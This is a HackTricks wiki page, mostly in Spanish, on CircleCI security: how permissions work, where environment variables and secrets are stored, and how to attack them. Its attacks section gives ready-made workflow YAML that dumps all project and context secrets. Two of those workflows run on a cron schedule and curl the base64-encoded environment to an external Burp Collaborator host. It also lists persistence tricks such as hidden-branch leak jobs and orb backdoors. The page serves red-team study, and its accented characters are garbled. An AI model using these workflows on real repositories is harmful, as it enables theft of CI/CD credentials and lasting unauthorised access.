# CircleCI Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) es una plataforma de Integraci칩n Continua donde puedes **definir plantillas** indicando lo que quieres que haga con alg칰n c칩digo y cu치ndo hacerlo. De esta manera, puedes **automatizar pruebas** o **despliegues** directamente **desde la rama principal de tu repositorio**, por ejemplo.

### Permissions

**CircleCI** **hereda los permisos** de github y bitbucket relacionados con la **cuenta** que inicia sesi칩n.\
En mis pruebas verifiqu칠 que mientras tengas **permisos de escritura sobre el repositorio en github**, podr치s **gestionar la configuraci칩n del proyecto en CircleCI** (configurar nuevas claves ssh, obtener claves api del proyecto, crear nuevas ramas con nuevas configuraciones de CircleCI...).

Sin embargo, necesitas ser un **administrador del repositorio** para **convertir el repositorio en un proyecto de CircleCI**.

### Env Variables & Secrets

Seg칰n [**la documentaci칩n**](https://circleci.com/docs/2.0/env-vars/) hay diferentes formas de **cargar valores en variables de entorno** dentro de un flujo de trabajo.

#### Built-in env variables

Cada contenedor ejecutado por CircleCI siempre tendr치 [**variables de entorno espec칤ficas definidas en la documentaci칩n**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) como `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` o `CIRCLE_USERNAME`.

#### Clear text

Puedes declararlas en texto claro dentro de un **comando**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Puedes declararlos en texto claro dentro del **entorno de ejecuci칩n**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Puedes declararlos en texto claro dentro del **build-job environment**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Puedes declararlos en texto claro dentro del **entorno de un contenedor**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Secretos del Proyecto

Estos son **secretos** que solo van a ser **accesibles** por el **proyecto** (por **cualquier rama**).\
Puedes verlos **declarados en** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
La funcionalidad de "**Importar Variables**" permite **importar variables de otros proyectos** a este.
{% endhint %}

#### Secretos de Contexto

Estos son secretos que son **a nivel de organizaci칩n**. Por **defecto, cualquier repo** podr치 **acceder a cualquier secreto** almacenado aqu칤:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Sin embargo, ten en cuenta que se puede **seleccionar un grupo diferente** (en lugar de Todos los miembros) para **dar acceso a los secretos solo a personas espec칤ficas**.\
Esta es actualmente una de las mejores maneras de **aumentar la seguridad de los secretos**, para no permitir que todos accedan a ellos, sino solo algunas personas.
{% endhint %}

### Ataques

#### Buscar Secretos en Texto Claro

Si tienes **acceso al VCS** (como github), revisa el archivo `.circleci/config.yml` de **cada repo en cada rama** y **busca** posibles **secretos en texto claro** almacenados all칤.

#### Enumeraci칩n de Variables de Entorno Secretas y Contexto

Revisando el c칩digo puedes encontrar **todos los nombres de los secretos** que est치n siendo **utilizados** en cada archivo `.circleci/config.yml`. Tambi칠n puedes obtener los **nombres de contexto** de esos archivos o revisarlos en la consola web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Exfiltrar Secretos del Proyecto

{% hint style="warning" %}
Para **exfiltrar TODOS** los **SECRETOS** del proyecto y contexto, **solo** necesitas tener acceso de **ESCRITURA** a **solo 1 repo** en toda la organizaci칩n de github (_y tu cuenta debe tener acceso a los contextos, pero por defecto todos pueden acceder a cada contexto_).
{% endhint %}

{% hint style="danger" %}
La funcionalidad de "**Importar Variables**" permite **importar variables de otros proyectos** a este. Por lo tanto, un atacante podr칤a **importar todas las variables del proyecto de todos los repos** y luego **exfiltrar todas juntas**.
{% endhint %}

Todos los secretos del proyecto siempre se establecen en el entorno de los trabajos, por lo que solo llamar a env y ofuscarlo en base64 exfiltrar치 los secretos en la **consola de registro web de workflows**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se utiliza CircleCI, puedes **crear un flujo de trabajo** que se **dispare cada minuto** y que **exfiltre los secretos a una direcci칩n externa**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Exfiltrar secretos de contexto

Necesitas **especificar el nombre del contexto** (esto tambi칠n exfiltrar치 los secretos del proyecto):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se utiliza CircleCI, puedes **modificar un flujo de trabajo** que se **activa cada minuto** y que **exfiltra los secretos a una direcci칩n externa**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Crear un nuevo `.circleci/config.yml` en un repositorio **no es suficiente para activar una construcci칩n de circleci**. Necesitas **habilitarlo como un proyecto en la consola de circleci**.
{% endhint %}

#### Escape to Cloud

**CircleCI** te da la opci칩n de ejecutar **tus construcciones en sus m치quinas o en las tuyas**.\
Por defecto, sus m치quinas est치n ubicadas en GCP, y al principio no podr치s encontrar nada relevante. Sin embargo, si una v칤ctima est치 ejecutando las tareas en **sus propias m치quinas (potencialmente, en un entorno en la nube)**, podr칤as encontrar un **punto final de metadatos en la nube con informaci칩n interesante**.

Ten en cuenta que en los ejemplos anteriores se lanz칩 todo dentro de un contenedor de docker, pero tambi칠n puedes **pedir que se lance una m치quina VM** (que puede tener diferentes permisos en la nube):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
O incluso un contenedor de docker con acceso a un servicio de docker remoto:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persistencia

* Es posible **crear** **tokens de usuario en CircleCI** para acceder a los endpoints de la API con el acceso del usuario.
* _https://app.circleci.com/settings/user/tokens_
* Es posible **crear tokens de proyectos** para acceder al proyecto con los permisos otorgados al token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Es posible **agregar claves SSH** a los proyectos.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Es posible **crear un trabajo cron en una rama oculta** en un proyecto inesperado que est치 **filtrando** todas las variables de **contexto env** todos los d칤as.
* O incluso crear en una rama / modificar un trabajo conocido que **filtrar치** todos los secretos de **contexto** y **proyectos** todos los d칤as.
* Si eres un propietario de github, puedes **permitir orbs no verificados** y configurar uno en un trabajo como **puerta trasera**.
* Puedes encontrar una **vulnerabilidad de inyecci칩n de comandos** en alguna tarea e **inyectar comandos** a trav칠s de un **secreto** modificando su valor.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
